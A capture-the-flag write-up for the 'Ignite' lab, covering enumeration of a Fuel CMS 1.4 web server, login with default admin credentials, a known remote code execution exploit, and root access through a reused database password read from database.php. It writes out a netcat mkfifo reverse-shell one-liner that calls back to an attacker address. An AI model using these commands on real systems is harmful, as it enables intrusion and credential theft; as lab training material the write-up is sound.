# Ignite Write-Up

## Overview

This is an easy level CTF called Ignite. It specifically says "A new startup has a few issues with their web server." And we are tasked with getting two flags (user.txt and root.txt).

## Enumeration

I started with an nmap scan to see which ports are available with the given IP. This is a web application CTF, so I know there will be an http or https port open at the least.

After the scan we see that port 80 is the only port open. With the aggressive scan we can also see that the http title says "Welcome to Fuel CMS". This is a content management system and I wanted to check the version if I can. Additionally, there is a robots.txt which disallows the directory /fuel. So we will check both of these out.

<img width="997" height="661" alt="nmap" src="https://github.com/user-attachments/assets/024b79d3-6f52-4513-b0e8-554645408896" />

I also ran a gobuster scan to see if there were any other directories of value; however, I did not find anything of importance.

<img width="399" height="244" alt="gobuster" src="https://github.com/user-attachments/assets/38660e96-9c43-41db-9068-5598b2be2436" />

Looking at the website we see that this is powered by Fuel CMS 1.4.

<img width="677" height="334" alt="fuel" src="https://github.com/user-attachments/assets/69b6d55d-39d6-46ea-b67b-8fa326ac6e9f" />


And there is quite a lot of information on the website. There are admin login credentials for the fuel directory given. They are: admin and admin. So I went to test these out to see if they weren't changed. And sure enough, they worked. After looking into the admin panel I found a few things that could be valuable. There was an assets page where you could upload a file and there was a page that showed the permissions of our user. This immediately made me think of a file upload RCE, so maybe we could get a web shell this way.

## Initial Access

Before I went any deeper I decided to check searchsploit to see if there were any known vulnerabilities in Fuel CMS version 1.4. And I found that this CMS version was vulnerable to remote code execution or RCE. Kali Linux gives you a database through exploitdb so I decided to use the python code available for the RCE.

<img width="353" height="86" alt="2026-08-12_11-11" src="https://github.com/user-attachments/assets/2fb5d526-5864-4582-98c2-a295f033e0df" />
<img width="986" height="233" alt="2026-08-12_11-10" src="https://github.com/user-attachments/assets/051f36a4-e4ce-4206-b1c5-39f2b2730a98" />



After executing the python code, we have a web shell. Worked great.

Although we have a web shell it is not the best. No ctrl+c, no su, no ssh, etc. I find the best practice is to use netcat to listen and export the webshell to our own terminal and then stabilize it for better functionality. So I first set up the netcat listener on a separate terminal listening on port 1234. Then I used the netcat reverse shell provided by [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). This is the command that I used: ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ADDRESS> <NC_LISTENER_PORT> >/tmp/f``` Make sure to change the port and IP to your THM VPN or Attackbox. Then to stabilize the shell we use this command (make sure the host has python): ```python3 -c ‘import pty;pty.spawn(“/bin/bash”)’``` Then use: ```export TERM=xterm```

We now have our interactive shell and we are ready for the flags. I changed directory to /home and we see that there is the first flag: user.txt!

<img width="305" height="191" alt="2026-08-12_11-25" src="https://github.com/user-attachments/assets/cd8b0e11-d7b8-472d-bf40-b5544f32fda6" />

## Privilege Escalation

Using the ```whoami``` command we see that we are www-data. And we are still looking for the root.txt flag. So we need to escalate privileges. I ran the typical ```sudo -l``` and ```find / -perm -4000 -type f 2>/dev/null``` to enumerate sudo permissions and SUID binaries that could give us potential privilege escalation paths. However, I did not find anything of value doing this. But I did remember what the website said about the database (if installed). This would give us the username and password which could potentially give us root access if credentials were reused. I searched around and found the database configuration. It's in the directory: /var/www/html/fuel/application/config/ and we are specifically looking at the database.php. And after we use cat to view the database file we find a username and password.

<img width="382" height="293" alt="2026-08-12_11-39_1" src="https://github.com/user-attachments/assets/b78bfe8e-cbd5-4019-83a4-4c57d13e8815" />

Simply ```su``` and enter the password. And this works! Then navigate to the /root directory and we find the final flag!
